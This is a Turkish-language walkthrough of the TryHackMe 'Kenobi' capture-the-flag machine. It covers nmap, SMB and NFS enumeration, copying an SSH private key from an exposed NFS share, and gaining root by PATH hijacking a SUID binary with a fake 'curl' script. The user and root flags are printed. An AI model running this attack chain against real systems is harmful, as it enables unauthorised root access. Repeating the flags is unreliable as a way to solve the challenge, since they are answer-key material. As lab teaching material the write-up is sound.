# TryHackMe - Kenobi Writeup

# Reconnaissance

İlk olarak hedef makine üzerinde tam port taraması gerçekleştiriyoruz.

```bash
nmap -sS -sC -sV -p- 10.113.156.213
```

![[Pasted image 20260719161236.png]]

Açık portlar:

| Port | Service | Version |
|------|----------|---------|
|21|FTP|ProFTPD 1.3.5|
|22|SSH|OpenSSH|
|80|HTTP|Apache 2.4.41|
|111|rpcbind|RPC|
|139|SMB|Samba|
|445|SMB|Samba|
|2049|NFS|NFS|

## Soru

> Makinede kaç port açık?

**Cevap:** `7`

---

# SMB Enumeration

SMB paylaşımlarını listelemek için:

```bash
smbclient -L //10.113.156.213/ -N
```

![[Pasted image 20260719161914.png]]

Bulunan paylaşımlar:

- print$
- anonymous
- IPC$

## Soru

> Kaç paylaşım bulundu?

**Cevap:** `3`

---

## Anonymous Share

Anonymous paylaşımına bağlanıyoruz.

```bash
smbclient //10.113.156.213/anonymous -N
```

![[Pasted image 20260719162033.png]]

Dosyaları listeliyoruz.

```bash
ls
```

Karşımıza:

```
log.txt
```

çıkıyor.

Dosyayı indiriyoruz.

```bash
get log.txt
```

SMB shell'den çıkıp Kali üzerinde dosyayı inceliyoruz.

```bash
cat log.txt
```

Log dosyasında önemli bilgiler bulunuyor.

- Kullanıcı adı: **kenobi**
- FTP servisinin **ProFTPD 1.3.5** kullandığı görülüyor.

---

## Sorular

**Bağlantı kurulduktan sonra hangi dosya görülüyor?**

```
log.txt
```

**FTP hangi portta çalışıyor?**

```
21
```

**ProFTPD sürümü nedir?**

```
1.3.5
```

---

# NFS Enumeration

İlk nmap çıktısında aşağıdaki servisleri görüyoruz.

```
111 rpcbind
2049 nfs
mountd
```

Bu nedenle NFS exportlarını kontrol ediyoruz.

```bash
showmount -e 10.113.156.213
```

![[showmount.png]]

Çıktı:

```
/var *
```

## Soru

> What mount can we see?

**Cevap**

```
/var
```

---

# Mount NFS Share

Paylaşımı kendi sistemimize mount ediyoruz.

```bash
mkdir -p /mnt/kenobi

sudo mount -t nfs 10.113.156.213:/var /mnt/kenobi
```

Ardından içerikleri inceliyoruz.

```bash
ls -la /mnt/kenobi
```

ve özellikle:

```bash
ls -la /mnt/kenobi/tmp
```

![[idrsakadar.png]]

Burada dikkat çeken dosya:

```
id_rsa
```

SSH private key'i Kali makinemize kopyalıyoruz.

```bash
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
```

SSH ile giriş yapıyoruz.

```bash
ssh -i id_rsa kenobi@10.113.156.213
```

> SSH bağlantısı kurarken private key'in doğru path'i verilmelidir.

---

# User Flag

Bağlandıktan sonra kullanıcı dizinine gidiyoruz.

```bash
cd ~
cat user.txt
```

```
d0b0f3f53b6caa532a83915e19224899
```

---

# Searchsploit

Log dosyasından öğrendiğimiz ProFTPD sürümünü araştırıyoruz.

```bash
searchsploit ProFTPD 1.3.5
```

![[Pasted image 20260719165236.png]]

## Soru

> ProFTPD'nin çalıştırılmasında kaç güvenlik açığı bulunuyor?

**Cevap**

```
4
```

---

# Privilege Escalation Enumeration

SUID binarylerini listeliyoruz.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Dikkat çeken dosya:

```
/usr/bin/menu
```

## Soru

> Hangi dosya olağan dışı görünüyor?

**Cevap**

```
/usr/bin/menu
```

Programı çalıştırıyoruz.

```bash
/usr/bin/menu
```

```
1. status check
2. kernel version
3. ifconfig
```

## Soru

> Kaç seçenek bulunuyor?

**Cevap**

```
3
```

---

# PATH Hijacking

Binary'nin kullandığı komutları inceliyoruz.

```bash
strings /usr/bin/menu
```

Çıktıda:

```
curl
uname
ifconfig
```

komutlarının tam path kullanılmadan çağrıldığı görülüyor.

Bu nedenle **PATH Hijacking** zafiyetinden yararlanıyoruz.

Geçici dizinde sahte bir `curl` oluşturuyoruz.

```bash
cd /tmp

cat > curl << EOF
#!/bin/bash
/bin/bash -p
EOF

chmod +x curl
```

PATH değişkenini güncelliyoruz.

```bash
export PATH=/tmp:$PATH
```

Kontrol ediyoruz.

```bash
which curl
```

```
/tmp/curl
```

Artık menüyü tekrar çalıştırıyoruz.

```bash
/usr/bin/menu
```

ve

```
1
```

seçeneğini giriyoruz.

Program root yetkisiyle bizim hazırladığımız `curl` dosyasını çalıştırdığı için root shell elde ediyoruz.

---

# Root Flag

```bash
cd /root

cat root.txt
```

```
177b3cd8562289f37382721c28381f02
```

![[Pasted image 20260719170010.png]]

---

# Flags

## User

```
d0b0f3f53b6caa532a83915e19224899
```

## Root

```
177b3cd8562289f37382721c28381f02
```

---

# Techniques Used

- Nmap Enumeration
- SMB Enumeration
- Anonymous SMB Share
- NFS Enumeration
- NFS Mount
- SSH Private Key Authentication
- Searchsploit
- SUID Enumeration
- PATH Hijacking
- Privilege Escalation

---

# Lessons Learned

- Nmap çıktısındaki servisler birbiriyle ilişkilendirilmelidir.
- SMB üzerinden elde edilen bilgiler diğer servislerin istismarında kullanılabilir.
- NFS exportları mutlaka kontrol edilmelidir.
- SUID binary'lerde tam path kullanılmayan `system()` çağrıları PATH Hijacking zafiyetine yol açabilir.
- Basit görünen servis konfigürasyon hataları zincirlenerek tam yetkili erişime dönüştürülebilir.
